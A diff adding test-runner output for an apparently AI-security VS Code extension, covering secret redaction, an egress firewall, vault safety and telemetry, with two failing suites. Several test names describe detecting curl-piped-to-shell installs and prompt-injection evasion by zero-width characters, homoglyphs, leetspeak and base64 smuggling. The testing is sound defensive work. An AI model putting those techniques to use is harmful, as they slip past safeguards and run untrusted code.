+    # Subtest: points every catalogue entry at a command that exists
+    ok 2 - points every catalogue entry at a command that exists
+      ---
+      duration_ms: 0.7832
+      type: 'test'
+      ...
+    # Subtest: describes each report in one line, so the user can choose without guessing
+    ok 3 - describes each report in one line, so the user can choose without guessing
+      ---
+      duration_ms: 0.6805
+      type: 'test'
+      ...
+    # Subtest: keeps every individual report command registered for automation
+    ok 4 - keeps every individual report command registered for automation
+      ---
+      duration_ms: 1.1283
+      type: 'test'
+      ...
+    # Subtest: lists no duplicate command in the catalogue
+    ok 5 - lists no duplicate command in the catalogue
+      ---
+      duration_ms: 0.4367
+      type: 'test'
+      ...
+    # Subtest: hides the individual report commands it replaces
+    ok 6 - hides the individual report commands it replaces
+      ---
+      duration_ms: 0.3625
+      type: 'test'
+      ...
+    1..6
+ok 55 - one Open Report entry point replaces eighteen show* rows
+  ---
+  duration_ms: 5.38
+  type: 'suite'
+  ...
+# Subtest: the README stops advertising a command count
+    # Subtest: does not sell the raw number of commands as a feature
+    ok 1 - does not sell the raw number of commands as a feature
+      ---
+      duration_ms: 0.7153
+      type: 'test'
+      ...
+    1..1
+ok 56 - the README stops advertising a command count
+  ---
+  duration_ms: 0.97
+  type: 'suite'
+  ...
+# Subtest: buildScreenShareWarnings (\#6)
+    # Subtest: flags secret files at any depth, not only at the workspace root
+    ok 1 - flags secret files at any depth, not only at the workspace root
+      ---
+      duration_ms: 43.258
+      type: 'test'
+      ...
+    # Subtest: flags key material and named secrets
+    ok 2 - flags key material and named secrets
+      ---
+      duration_ms: 2.081
+      type: 'test'
+      ...
+    # Subtest: does not flag ordinary source files
+    ok 3 - does not flag ordinary source files
+      ---
+      duration_ms: 1.1025
+      type: 'test'
+      ...
+    1..3
+ok 57 - buildScreenShareWarnings (\#6)
+  ---
+  duration_ms: 55.9523
+  type: 'suite'
+  ...
+# Subtest: evaluateOsvNudge (\#7)
+    # Subtest: never claims risky packages were found when no scan ran
+    ok 1 - never claims risky packages were found when no scan ran
+      ---
+      duration_ms: 1.7034
+      type: 'test'
+      ...
+    # Subtest: reports the real count when a scan did run
+    ok 2 - reports the real count when a scan did run
+      ---
+      duration_ms: 4.967
+      type: 'test'
+      ...
+    # Subtest: stays quiet after a clean scan, and whenever OSV is already always-on
+    ok 3 - stays quiet after a clean scan, and whenever OSV is already always-on
+      ---
+      duration_ms: 1.1714
+      type: 'test'
+      ...
+    1..3
+ok 58 - evaluateOsvNudge (\#7)
+  ---
+  duration_ms: 10.497
+  type: 'suite'
+  ...
+# Subtest: parseGitHooksPath (\#5)
+    # Subtest: detects a husky-style core.hooksPath so a dead hook is never installed
+    ok 1 - detects a husky-style core.hooksPath so a dead hook is never installed
+      ---
+      duration_ms: 2.2551
+      type: 'test'
+      ...
+    # Subtest: ignores hooksPath declared under another section
+    ok 2 - ignores hooksPath declared under another section
+      ---
+      duration_ms: 1.1755
+      type: 'test'
+      ...
+    # Subtest: returns null for a normal repo config
+    ok 3 - returns null for a normal repo config
+      ---
+      duration_ms: 1.1308
+      type: 'test'
+      ...
+    # Subtest: strips quotes around the value
+    ok 4 - strips quotes around the value
+      ---
+      duration_ms: 2.3522
+      type: 'test'
+      ...
+    1..4
+ok 59 - parseGitHooksPath (\#5)
+  ---
+  duration_ms: 21.8994
+  type: 'suite'
+  ...
+# Subtest: buildPreCommitHook (\#5)
+    # Subtest: is a POSIX script that blocks on a match and exits 0 otherwise
+    ok 1 - is a POSIX script that blocks on a match and exits 0 otherwise
+      ---
+      duration_ms: 0.7912
+      type: 'test'
+      ...
+    1..1
+ok 60 - buildPreCommitHook (\#5)
+  ---
+  duration_ms: 1.2384
+  type: 'suite'
+  ...
+# Subtest: resolveLocalModelLogFiles (\#8)
+    # Subtest: expands the LM Studio log DIRECTORY into the files inside it
+    ok 1 - expands the LM Studio log DIRECTORY into the files inside it
+      ---
+      duration_ms: 5.9643
+      type: 'test'
+      ...
+    # Subtest: passes plain log files straight through
+    ok 2 - passes plain log files straight through
+      ---
+      duration_ms: 0.6825
+      type: 'test'
+      ...
+    # Subtest: returns nothing when no local model is installed
+    ok 3 - returns nothing when no local model is installed
+      ---
+      duration_ms: 0.9839
+      type: 'test'
+      ...
+    # Subtest: bounds how many files it pulls out of one directory
+    ok 4 - bounds how many files it pulls out of one directory
+      ---
+      duration_ms: 1.6468
+      type: 'test'
+      ...
+    1..4
+ok 61 - resolveLocalModelLogFiles (\#8)
+  ---
+  duration_ms: 9.8357
+  type: 'suite'
+  ...
+# Subtest: scanAICodeForVulns (\#3)
+    # Subtest: matches injection-prone AI-generated patterns
+    ok 1 - matches injection-prone AI-generated patterns
+      ---
+      duration_ms: 5.3513
+      type: 'test'
+      ...
+    # Subtest: is stateless across calls despite global regexes
+    ok 2 - is stateless across calls despite global regexes
+      ---
+      duration_ms: 1.225
+      type: 'test'
+      ...
+    # Subtest: stays quiet on clean code
+    ok 3 - stays quiet on clean code
+      ---
+      duration_ms: 1.7953
+      type: 'test'
+      ...
+    1..3
+ok 62 - scanAICodeForVulns (\#3)
+  ---
+  duration_ms: 9.1806
+  type: 'suite'
+  ...
+# Subtest: RAG egress detection (\#4) is reachable from this module
+    # Subtest: re-exports a live implementation rather than a dead local copy
+    ok 1 - re-exports a live implementation rather than a dead local copy
+      ---
+      duration_ms: 0.6138
+      type: 'test'
+      ...
+    1..1
+ok 63 - RAG egress detection (\#4) is reachable from this module
+  ---
+  duration_ms: 0.8226
+  type: 'suite'
+  ...
+# Subtest: DepGuard heuristics
+    # Subtest: flags curl|sh install as critical
+    ok 1 - flags curl|sh install as critical
+      ---
+      duration_ms: 10.2465
+      type: 'test'
+      ...
+    # Subtest: flags typosquat-like package names
+    ok 2 - flags typosquat-like package names
+      ---
+      duration_ms: 4.7647
+      type: 'test'
+      ...
+    # Subtest: flags unpinned and remote URL installs
+    ok 3 - flags unpinned and remote URL installs
+      ---
+      duration_ms: 2.952
+      type: 'test'
+      ...
+    # Subtest: parses npm install package@version
+    ok 4 - parses npm install package@version
+      ---
+      duration_ms: 6.6439
+      type: 'test'
+      ...
+    1..4
+ok 64 - DepGuard heuristics
+  ---
+  duration_ms: 39.0065
+  type: 'suite'
+  ...
+# Subtest: DepGuard OSV client (mocked)
+    # Subtest: skips unpinned versions without inventing CVEs
+    ok 1 - skips unpinned versions without inventing CVEs
+      ---
+      duration_ms: 4.9275
+      type: 'test'
+      ...
+    # Subtest: maps OSV vulns from a successful query
+    ok 2 - maps OSV vulns from a successful query
+      ---
+      duration_ms: 137.2854
+      type: 'test'
+      ...
+    # Subtest: returns error metadata on HTTP failure without throwing
+    ok 3 - returns error metadata on HTTP failure without throwing
+      ---
+      duration_ms: 1.3393
+      type: 'test'
+      ...
+    # Subtest: batch query maps results by index
+    ok 4 - batch query maps results by index
+      ---
+      duration_ms: 5.3109
+      type: 'test'
+      ...
+    1..4
+ok 65 - DepGuard OSV client (mocked)
+  ---
+  duration_ms: 150.1618
+  type: 'suite'
+  ...
+# Subtest: menu surfaces exist at all
+    # Subtest: contributes more than just the Command Palette
+    ok 1 - contributes more than just the Command Palette
+      ---
+      duration_ms: 9.3024
+      type: 'test'
+      ...
+    # Subtest: puts SoterAI in the editor context menu, where text is selected
+    ok 2 - puts SoterAI in the editor context menu, where text is selected
+      ---
+      duration_ms: 0.6116
+      type: 'test'
+      ...
+    # Subtest: puts SoterAI in the explorer context menu, where files are chosen
+    ok 3 - puts SoterAI in the explorer context menu, where files are chosen
+      ---
+      duration_ms: 1.5214
+      type: 'test'
+      ...
+    # Subtest: puts SoterAI in source control, where secrets get committed
+    ok 4 - puts SoterAI in source control, where secrets get committed
+      ---
+      duration_ms: 2.9632
+      type: 'test'
+      ...
+    1..4
+ok 66 - menu surfaces exist at all
+  ---
+  duration_ms: 25.1541
+  type: 'suite'
+  ...
+# Subtest: menu entries are wired to real commands
+    # Subtest: references only declared commands
+    ok 1 - references only declared commands
+      ---
+      duration_ms: 13.3513
+      type: 'test'
+      ...
+    # Subtest: references only declared submenus
+    ok 2 - references only declared submenus
+      ---
+      duration_ms: 1.656
+      type: 'test'
+      ...
+    # Subtest: gives every submenu at least one item, so it is never an empty arrow
+    ok 3 - gives every submenu at least one item, so it is never an empty arrow
+      ---
+      duration_ms: 1.6242
+      type: 'test'
+      ...
+    # Subtest: gates every context-menu entry with a when clause
+    not ok 4 - gates every context-menu entry with a when clause
+      ---
+      duration_ms: 16.4192
+      type: 'test'
+      location: 'C:\\Users\\USER\\OneDrive\\Desktop\\Ai-Agent-Security-Guard\\packages\\vscode-extension\\src\\__tests__\\discoverability.test.ts:2:3745'
+      failureType: 'testCodeFailure'
+      error: |-
+        soterai.explorerContext -> soterai.blockFromAI has no when clause
+        + actual - expected
+        
+        + [
+        +   'soterai.explorerContext -> soterai.blockFromAI has no when clause'
+        + ]
+        - []
+        
+      code: 'ERR_ASSERTION'
+      name: 'AssertionError'
+      expected:
+      actual:
+        0: 'soterai.explorerContext -> soterai.blockFromAI has no when clause'
+      operator: 'deepStrictEqual'
+      stack: |-
+        TestContext.<anonymous> (C:\Users\USER\OneDrive\Desktop\Ai-Agent-Security-Guard\packages\vscode-extension\src\__tests__\discoverability.test.ts:115:16)
+        Test.runInAsyncScope (node:async_hooks:214:14)
+        Test.run (node:internal/test_runner/test:1047:25)
+        Suite.processPendingSubtests (node:internal/test_runner/test:744:18)
+        Test.postRun (node:internal/test_runner/test:1173:19)
+        Test.run (node:internal/test_runner/test:1101:12)
+        async Suite.processPendingSubtests (node:internal/test_runner/test:744:7)
+      ...
+    # Subtest: gives every view/title command an icon
+    ok 5 - gives every view/title command an icon
+      ---
+      duration_ms: 13.812
+      type: 'test'
+      ...
+    1..5
+not ok 67 - menu entries are wired to real commands
+  ---
+  duration_ms: 49.9555
+  type: 'suite'
+  location: 'C:\\Users\\USER\\OneDrive\\Desktop\\Ai-Agent-Security-Guard\\packages\\vscode-extension\\src\\__tests__\\discoverability.test.ts:2:2661'
+  failureType: 'subtestsFailed'
+  error: '1 subtest failed'
+  code: 'ERR_TEST_FAILURE'
+  ...
+# Subtest: keybindings
+    # Subtest: binds the two highest-frequency safe actions
+    ok 1 - binds the two highest-frequency safe actions
+      ---
+      duration_ms: 0.7534
+      type: 'test'
+      ...
+    # Subtest: stays small, because every binding is taken from the user's own budget
+    ok 2 - stays small, because every binding is taken from the user's own budget
+      ---
+      duration_ms: 0.5291
+      type: 'test'
+      ...
+    # Subtest: binds only declared commands, and offers a mac chord for each
+    ok 3 - binds only declared commands, and offers a mac chord for each
+      ---
+      duration_ms: 0.5074
+      type: 'test'
+      ...
+    # Subtest: avoids shallow chords that collide with core editor keys
+    ok 4 - avoids shallow chords that collide with core editor keys
+      ---
+      duration_ms: 2.0362
+      type: 'test'
+      ...
+    1..4
+ok 68 - keybindings
+  ---
+  duration_ms: 4.4923
+  type: 'suite'
+  ...
+# Subtest: view welcome content
+    # Subtest: gives an empty view something to say
+    ok 1 - gives an empty view something to say
+      ---
+      duration_ms: 0.98
+      type: 'test'
+      ...
+    # Subtest: targets views this extension actually contributes
+    ok 2 - targets views this extension actually contributes
+      ---
+      duration_ms: 0.627
+      type: 'test'
+      ...
+    # Subtest: offers a runnable command link, not just prose
+    ok 3 - offers a runnable command link, not just prose
+      ---
+      duration_ms: 1.1089
+      type: 'test'
+      ...
+    1..3
+ok 69 - view welcome content
+  ---
+  duration_ms: 3.2165
+  type: 'suite'
+  ...
+# Subtest: egress firewall — clean content
+    # Subtest: allows ordinary text
+    ok 1 - allows ordinary text
+      ---
+      duration_ms: 163.647
+      type: 'test'
+      ...
+    # Subtest: allows empty/whitespace input without scanning
+    ok 2 - allows empty/whitespace input without scanning
+      ---
+      duration_ms: 1.2637
+      type: 'test'
+      ...
+    1..2
+ok 70 - egress firewall — clean content
+  ---
+  duration_ms: 169.7803
+  type: 'suite'
+  ...
+# Subtest: egress firewall — secrets
+    # Subtest: returns REDACT with a safe copy when only a secret is present
+    ok 1 - returns REDACT with a safe copy when only a secret is present
+      ---
+      duration_ms: 16.6462
+      type: 'test'
+      ...
+    # Subtest: never leaks the raw secret into findings evidence
+    ok 2 - never leaks the raw secret into findings evidence
+      ---
+      duration_ms: 3.6022
+      type: 'test'
+      ...
+    # Subtest: escalates to BLOCK when a secret rides along with an injection
+    ok 3 - escalates to BLOCK when a secret rides along with an injection
+      ---
+      duration_ms: 1.9703
+      type: 'test'
+      ...
+    1..3
+ok 71 - egress firewall — secrets
+  ---
+  duration_ms: 22.9231
+  type: 'suite'
+  ...
+# Subtest: egress firewall — injection
+    # Subtest: asks before sending a plain injection attempt
+    ok 1 - asks before sending a plain injection attempt
+      ---
+      duration_ms: 1.7017
+      type: 'test'
+      ...
+    # Subtest: asks before sending paraphrased override
+    ok 2 - asks before sending paraphrased override
+      ---
+      duration_ms: 7.5845
+      type: 'test'
+      ...
+    # Subtest: asks before sending indirect extraction
+    ok 3 - asks before sending indirect extraction
+      ---
+      duration_ms: 1.1728
+      type: 'test'
+      ...
+    # Subtest: asks before sending split-word override
+    ok 4 - asks before sending split-word override
+      ---
+      duration_ms: 0.8711
+      type: 'test'
+      ...
+    # Subtest: asks before sending Devanagari Hindi override
+    ok 5 - asks before sending Devanagari Hindi override
+      ---
+      duration_ms: 115.0063
+      type: 'test'
+      ...
+    # Subtest: catches zero-width-interrupted injection the raw regex misses
+    ok 6 - catches zero-width-interrupted injection the raw regex misses
+      ---
+      duration_ms: 1.2675
+      type: 'test'
+      ...
+    # Subtest: catches homoglyph-substituted injection
+    ok 7 - catches homoglyph-substituted injection
+      ---
+      duration_ms: 1.0071
+      type: 'test'
+      ...
+    # Subtest: catches leetspeak injection
+    ok 8 - catches leetspeak injection
+      ---
+      duration_ms: 0.9217
+      type: 'test'
+      ...
+    # Subtest: catches letter-spaced injection
+    ok 9 - catches letter-spaced injection
+      ---
+      duration_ms: 1.5477
+      type: 'test'
+      ...
+    # Subtest: catches base64-smuggled injection
+    ok 10 - catches base64-smuggled injection
+      ---
+      duration_ms: 2.1282
+      type: 'test'
+      ...
+    1..10
+ok 72 - egress firewall — injection
+  ---
+  duration_ms: 135.1169
+  type: 'suite'
+  ...
+# Subtest: egress firewall — destination awareness
+    # Subtest: recognises known AI hosts
+    ok 1 - recognises known AI hosts
+      ---
+      duration_ms: 1.3156
+      type: 'test'
+      ...
+    # Subtest: passes clean content through to an approved host unchanged
+    ok 2 - passes clean content through to an approved host unchanged
+      ---
+      duration_ms: 5.0358
+      type: 'test'
+      ...
+    # Subtest: asks when clean content heads to an unapproved host
+    ok 3 - asks when clean content heads to an unapproved host
+      ---
+      duration_ms: 1.0857
+      type: 'test'
+      ...
+    # Subtest: blocks secrets heading to an unapproved host
+    ok 4 - blocks secrets heading to an unapproved host
+      ---
+      duration_ms: 1.0139
+      type: 'test'
+      ...
+    # Subtest: does not silently allow an unparseable destination
+    ok 5 - does not silently allow an unparseable destination
+      ---
+      duration_ms: 2.6678
+      type: 'test'
+      ...
+    # Subtest: keeps the approved host list non-empty
+    ok 6 - keeps the approved host list non-empty
+      ---
+      duration_ms: 1.0692
+      type: 'test'
+      ...
+    1..6
+ok 73 - egress firewall — destination awareness
+  ---
+  duration_ms: 13.024
+  type: 'suite'
+  ...
+# Subtest: unicode folding primitives
+    # Subtest: strips zero-width characters
+    ok 1 - strips zero-width characters
+      ---
+      duration_ms: 1.5807
+      type: 'test'
+      ...
+    # Subtest: folds cyrillic lookalikes to latin
+    ok 2 - folds cyrillic lookalikes to latin
+      ---
+      duration_ms: 6.3252
+      type: 'test'
+      ...
+    # Subtest: decodes leetspeak
+    ok 3 - decodes leetspeak
+      ---
+      duration_ms: 1.4504
+      type: 'test'
+      ...
+    # Subtest: collapses spaced letters
+    ok 4 - collapses spaced letters
+      ---
+      duration_ms: 0.7232
+      type: 'test'
+      ...
+    # Subtest: leaves ordinary prose untouched
+    ok 5 - leaves ordinary prose untouched
+      ---
+      duration_ms: 0.3837
+      type: 'test'
+      ...
+    # Subtest: decodes only base64 that holds readable text
+    ok 6 - decodes only base64 that holds readable text
+      ---
+      duration_ms: 1.0616
+      type: 'test'
+      ...
+    # Subtest: scores clean text as unobfuscated and smuggled text as obfuscated
+    ok 7 - scores clean text as unobfuscated and smuggled text as obfuscated
+      ---
+      duration_ms: 2.0139
+      type: 'test'
+      ...
+    # Subtest: always includes the raw text as the first variant
+    ok 8 - always includes the raw text as the first variant
+      ---
+      duration_ms: 0.4394
+      type: 'test'
+      ...
+    # Subtest: does not duplicate variants when folding is a no-op
+    ok 9 - does not duplicate variants when folding is a no-op
+      ---
+      duration_ms: 1.9968
+      type: 'test'
+      ...
+    1..9
+ok 74 - unicode folding primitives
+  ---
+  duration_ms: 24.0962
+  type: 'suite'
+  ...
+# Subtest: Enforced API capability — Scenario A
+    # Subtest: injects the credential locally for the approved host/method/path and never exposes it to the caller
+    ok 1 - injects the credential locally for the approved host/method/path and never exposes it to the caller
+      ---
+      duration_ms: 25.5778
+      type: 'test'
+      ...
+    # Subtest: blocks wrong host, wrong method, and out-of-scope path
+    ok 2 - blocks wrong host, wrong method, and out-of-scope path
+      ---
+      duration_ms: 2.9741
+      type: 'test'
+      ...
+    # Subtest: blocks plaintext http even for the right host
+    ok 3 - blocks plaintext http even for the right host
+      ---
+      duration_ms: 1.6801
+      type: 'test'
+      ...
+    # Subtest: enforces use limit (replay past maxUses fails)
+    ok 4 - enforces use limit (replay past maxUses fails)
+      ---
+      duration_ms: 41.6711
+      type: 'test'
+      ...
+    # Subtest: fails on expiry
+    ok 5 - fails on expiry
+      ---
+      duration_ms: 48.3378
+      type: 'test'
+      ...
+    # Subtest: fails after revocation and on workspace mismatch
+    ok 6 - fails after revocation and on workspace mismatch
+      ---
+      duration_ms: 3.4961
+      type: 'test'
+      ...
+    # Subtest: emergency lockdown revokes every active capability at once
+    ok 7 - emergency lockdown revokes every active capability at once
+      ---
+      duration_ms: 1.9478
+      type: 'test'
+      ...
+    # Subtest: scans the response so a service cannot echo the secret back into AI context
+    ok 8 - scans the response so a service cannot echo the secret back into AI context
+      ---
+      duration_ms: 1.5347
+      type: 'test'
+      ...
+    # Subtest: metadata never leaks the secretRef mapping to a value
+    ok 9 - metadata never leaks the secretRef mapping to a value
+      ---
+      duration_ms: 2.3593
+      type: 'test'
+      ...
+    # Subtest: unknown handle fails closed
+    ok 10 - unknown handle fails closed
+      ---
+      duration_ms: 3.9794
+      type: 'test'
+      ...
+    1..10
+ok 75 - Enforced API capability — Scenario A
+  ---
+  duration_ms: 140.7841
+  type: 'suite'
+  ...
+# Subtest: enterprise policy pinning
+    # Subtest: soterai.protection.enabled declares a policy an administrator can pin
+    ok 1 - soterai.protection.enabled declares a policy an administrator can pin
+      ---
+      duration_ms: 4.0907
+      type: 'test'
+      ...
+    # Subtest: soterai.privacyMode declares a policy an administrator can pin
+    ok 2 - soterai.privacyMode declares a policy an administrator can pin
+      ---
+      duration_ms: 0.5618
+      type: 'test'
+      ...
+    # Subtest: soterai.cloud.enabled declares a policy an administrator can pin
+    ok 3 - soterai.cloud.enabled declares a policy an administrator can pin
+      ---
+      duration_ms: 0.3614
+      type: 'test'
+      ...
+    # Subtest: soterai.sentinel.enabled declares a policy an administrator can pin
+    ok 4 - soterai.sentinel.enabled declares a policy an administrator can pin
+      ---
+      duration_ms: 0.5823
+      type: 'test'
+      ...
+    # Subtest: soterai.protectedWorkspace.enabled declares a policy an administrator can pin
+    ok 5 - soterai.protectedWorkspace.enabled declares a policy an administrator can pin
+      ---
+      duration_ms: 0.3707
+      type: 'test'
+      ...
+    # Subtest: soterai.terminal.protectionMode declares a policy an administrator can pin
+    ok 6 - soterai.terminal.protectionMode declares a policy an administrator can pin
+      ---
+      duration_ms: 0.414
+      type: 'test'
+      ...
+    # Subtest: soterai.secretInterceptor.enabled declares a policy an administrator can pin
+    ok 7 - soterai.secretInterceptor.enabled declares a policy an administrator can pin
+      ---
+      duration_ms: 0.3166
+      type: 'test'
+      ...
+    # Subtest: soterai.autoVaultMigration.enabled declares a policy an administrator can pin
+    ok 8 - soterai.autoVaultMigration.enabled declares a policy an administrator can pin
+      ---
+      duration_ms: 0.4703
+      type: 'test'
+      ...
+    # Subtest: keeps every policy name unique, because one name can own only one setting
+    ok 9 - keeps every policy name unique, because one name can own only one setting
+      ---
+      duration_ms: 3.0972
+      type: 'test'
+      ...
+    # Subtest: pins only settings that are also machine-scoped and restricted
+    ok 10 - pins only settings that are also machine-scoped and restricted
+      ---
+      duration_ms: 1.8374
+      type: 'test'
+      ...
+    # Subtest: pins only value shapes a policy can carry
+    ok 11 - pins only value shapes a policy can carry
+      ---
+      duration_ms: 0.8344
+      type: 'test'
+      ...
+    1..11
+ok 76 - enterprise policy pinning
+  ---
+  duration_ms: 18.1443
+  type: 'suite'
+  ...
+# Subtest: detecting a setting an administrator pinned
+    # Subtest: reports not-managed when the effective value is the default
+    ok 1 - reports not-managed when the effective value is the default
+      ---
+      duration_ms: 15.1745
+      type: 'test'
+      ...
+    # Subtest: reports not-managed when the user's own global value wins
+    ok 2 - reports not-managed when the user's own global value wins
+      ---
+      duration_ms: 0.4449
+      type: 'test'
+      ...
+    # Subtest: ignores a workspace value for a machine-scoped setting
+    ok 3 - ignores a workspace value for a machine-scoped setting
+      ---
+      duration_ms: 2.6611
+      type: 'test'
+      ...
+    # Subtest: reports managed when no visible layer explains the effective value
+    ok 4 - reports managed when no visible layer explains the effective value
+      ---
+      duration_ms: 1.1036
+      type: 'test'
+      ...
+    # Subtest: compares values structurally, so an equal array is not a phantom policy
+    ok 5 - compares values structurally, so an equal array is not a phantom policy
+      ---
+      duration_ms: 0.4516
+      type: 'test'
+      ...
+    # Subtest: says nothing when the setting was never inspected
+    ok 6 - says nothing when the setting was never inspected
+      ---
+      duration_ms: 0.4565
+      type: 'test'
+      ...
+    1..6
+ok 77 - detecting a setting an administrator pinned
+  ---
+  duration_ms: 21.2254
+  type: 'suite'
+  ...
+# Subtest: the Control Panel shows a pinned guard as managed
+    # Subtest: marks the pinned control as managed and leaves the others alone
+    ok 1 - marks the pinned control as managed and leaves the others alone
+      ---
+      duration_ms: 2.8172
+      type: 'test'
+      ...
+    # Subtest: keeps the managed reason free of internal vocabulary
+    ok 2 - keeps the managed reason free of internal vocabulary
+      ---
+      duration_ms: 7.2452
+      type: 'test'
+      ...
+    1..2
+ok 78 - the Control Panel shows a pinned guard as managed
+  ---
+  duration_ms: 11.233
+  type: 'suite'
+  ...
+# Subtest: telemetry honours the editor's own preference
+    # Subtest: sends nothing when the host's telemetry is disabled
+    ok 1 - sends nothing when the host's telemetry is disabled
+      ---
+      duration_ms: 1.6995
+      type: 'test'
+      ...
+    # Subtest: sends nothing in local privacy mode, untrusted workspaces, or with cloud off
+    ok 2 - sends nothing in local privacy mode, untrusted workspaces, or with cloud off
+      ---
+      duration_ms: 0.4796
+      type: 'test'
+      ...
+    # Subtest: sends nothing when the user's own level is off
+    ok 3 - sends nothing when the user's own level is off
+      ---
+      duration_ms: 0.3661
+      type: 'test'
+      ...
+    # Subtest: permits a send only when every gate agrees
+    ok 4 - permits a send only when every gate agrees
+      ---
+      duration_ms: 0.3424
+      type: 'test'
+      ...
+    # Subtest: purges queued metadata when collection is disabled or privacy returns local
+    ok 5 - purges queued metadata when collection is disabled or privacy returns local
+      ---
+      duration_ms: 0.5181
+      type: 'test'
+      ...
+    1..5
+ok 79 - telemetry honours the editor's own preference
+  ---
+  duration_ms: 4.0547
+  type: 'suite'
+  ...
+# Subtest: telemetry source contracts
+    # Subtest: routes through the editor's telemetry logger instead of a hand-rolled queue
+    ok 1 - routes through the editor's telemetry logger instead of a hand-rolled queue
+      ---
+      duration_ms: 0.4948
+      type: 'test'
+      ...
+    # Subtest: does not silently claim a batch was delivered
+    ok 2 - does not silently claim a batch was delivered
+      ---
+      duration_ms: 0.4559
+      type: 'test'
+      ...
+    # Subtest: purges pending metadata when privacy-related configuration changes
+    ok 3 - purges pending metadata when privacy-related configuration changes
+      ---
+      duration_ms: 1.2528
+      type: 'test'
+      ...
+    1..3
+ok 80 - telemetry source contracts
+  ---
+  duration_ms: 2.9066
+  type: 'suite'
+  ...
+# Subtest: Command registration parity (\#4)
+    # Subtest: every declared command is registered
+    not ok 1 - every declared command is registered
+      ---
+      duration_ms: 21.1926
+      type: 'test'
+      location: 'C:\\Users\\USER\\OneDrive\\Desktop\\Ai-Agent-Security-Guard\\packages\\vscode-extension\\src\\__tests__\\extension.test.ts:2:3235'
+      failureType: 'testCodeFailure'
+      error: |-
+        Declared but not registered: soterai.blockFromAI, soterai.blockGlobFromAI, soterai.blockSelectionFromAI, soterai.manageAIRules, soterai.openRedactedPreview
+        + actual - expected
+        
+        + [
+        +   'soterai.blockFromAI',
+        +   'soterai.blockGlobFromAI',
+        +   'soterai.blockSelectionFromAI',
+        +   'soterai.manageAIRules',
+        +   'soterai.openRedactedPreview'
+        + ]
+        - []
+        
+      code: 'ERR_ASSERTION'
+      name: 'AssertionError'
+      expected:
+      actual:
+        0: 'soterai.blockFromAI'
+        1: 'soterai.blockGlobFromAI'
+        2: 'soterai.blockSelectionFromAI'
+        3: 'soterai.manageAIRules'
+        4: 'soterai.openRedactedPreview'
+      operator: 'deepStrictEqual'
+      stack: |-
+        TestContext.<anonymous> (C:\Users\USER\OneDrive\Desktop\Ai-Agent-Security-Guard\packages\vscode-extension\src\__tests__\extension.test.ts:63:16)
+        Test.runInAsyncScope (node:async_hooks:214:14)
+        Test.run (node:internal/test_runner/test:1047:25)
+        Test.start (node:internal/test_runner/test:944:17)
+        node:internal/test_runner/test:1440:71
+        node:internal/per_context/primordials:483:82
+        new Promise (<anonymous>)
+        new SafePromise (node:internal/per_context/primordials:451:29)
+        node:internal/per_context/primordials:483:9
+        Array.map (<anonymous>)
+      ...
+    # Subtest: every registered command is declared (no orphan handlers)
+    ok 2 - every registered command is declared (no orphan handlers)
+      ---
+      duration_ms: 1.2382
+      type: 'test'
+      ...
+    # Subtest: the three previously-missing commands are still registered
+    ok 3 - the three previously-missing commands are still registered
+      ---
+      duration_ms: 0.6851
+      type: 'test'
+      ...
+    1..3
+not ok 81 - Command registration parity (\#4)
+  ---
+  duration_ms: 28.5028
+  type: 'suite'
+  location: 'C:\\Users\\USER\\OneDrive\\Desktop\\Ai-Agent-Security-Guard\\packages\\vscode-extension\\src\\__tests__\\extension.test.ts:2:3171'
+  failureType: 'subtestsFailed'
+  error: '1 subtest failed'
+  code: 'ERR_TEST_FAILURE'
+  ...
+# Subtest: AI Context Firewall commands (Phases 1–7)
+    # Subtest: all firewall commands are declared AND registered
+    ok 1 - all firewall commands are declared AND registered
+      ---
+      duration_ms: 0.8927
+      type: 'test'
+      ...
+    1..1
+ok 82 - AI Context Firewall commands (Phases 1–7)
+  ---
+  duration_ms: 2.3183
+  type: 'suite'
+  ...
+# Subtest: Workspace Trust (\#5)
+    # Subtest: declares limited untrusted-workspace support
+    ok 1 - declares limited untrusted-workspace support
+      ---
+      duration_ms: 3.782
+      type: 'test'
+      ...
+    # Subtest: gates cloud connection behind workspace trust
+    ok 2 - gates cloud connection behind workspace trust
+      ---
+      duration_ms: 1.1815
+      type: 'test'
+      ...
+    # Subtest: gates the secret vault behind workspace trust
+    ok 3 - gates the secret vault behind workspace trust
+      ---
+      duration_ms: 25.3057
+      type: 'test'
+      ...
+    1..3
+ok 83 - Workspace Trust (\#5)
+  ---
+  duration_ms: 31.5349
+  type: 'suite'
+  ...
+# Subtest: Workspace filesystem containment
+    # Subtest: canonicalizes targets and rejects symlink or junction escapes before vault writes
+    ok 1 - canonicalizes targets and rejects symlink or junction escapes before vault writes
+      ---
+      duration_ms: 0.8382
+      type: 'test'
+      ...
+    1..1
+ok 84 - Workspace filesystem containment
+  ---
+  duration_ms: 1.3204
+  type: 'suite'
+  ...
+# Subtest: Vault safety — dry-run preview + backup + confirm
+    # Subtest: migration backup is encrypted and OUTSIDE the workspace (no plaintext .bak)
+    ok 1 - migration backup is encrypted and OUTSIDE the workspace (no plaintext .bak)
+      ---
+      duration_ms: 2.468
+      type: 'test'
+      ...
+    # Subtest: migration requires an explicit modal confirmation after previewing
+    ok 2 - migration requires an explicit modal confirmation after previewing
+      ---
+      duration_ms: 1.3267
+      type: 'test'
+      ...
+    # Subtest: vault status/preview surface metadata only — rawValue stays inside the encrypted store
+    ok 3 - vault status/preview surface metadata only — rawValue stays inside the encrypted store
+      ---
+      duration_ms: 0.7222
+      type: 'test'
+      ...
+    1..3
+ok 85 - Vault safety — dry-run preview + backup + confirm
+  ---
+  duration_ms: 5.612
+  type: 'suite'
+  ...
+# Subtest: Ledger privacy — no raw secrets persisted (\#6)
+    # Subtest: every ledger write goes through sanitizeLedgerEntry / buildLedgerEntry
+    ok 1 - every ledger write goes through sanitizeLedgerEntry / buildLedgerEntry
+      ---
+      duration_ms: 0.7156
+      type: 'test'
+      ...
+    # Subtest: ledger store never references raw content fields
+    ok 2 - ledger store never references raw content fields
+      ---
+      duration_ms: 0.5189
+      type: 'test'
+      ...
+    1..2
+ok 86 - Ledger privacy — no raw secrets persisted (\#6)
+  ---
+  duration_ms: 1.6648
+  type: 'suite'
+  ...
+# Subtest: Telemetry contains no raw content (\#6)
+    # Subtest: telemetry never references redactedText or raw content fields
+    ok 1 - telemetry never references redactedText or raw content fields
+      ---
+      duration_ms: 0.8511
+      type: 'test'
+      ...
+    # Subtest: event payload only uses the safe redacted preview
+    ok 2 - event payload only uses the safe redacted preview
+      ---
+      duration_ms: 0.6911
+      type: 'test'
+      ...
+    1..2
+ok 87 - Telemetry contains no raw content (\#6)
+  ---
+  duration_ms: 1.9108
+  type: 'suite'
+  ...
+# Subtest: SecretStorage token hygiene (\#6)
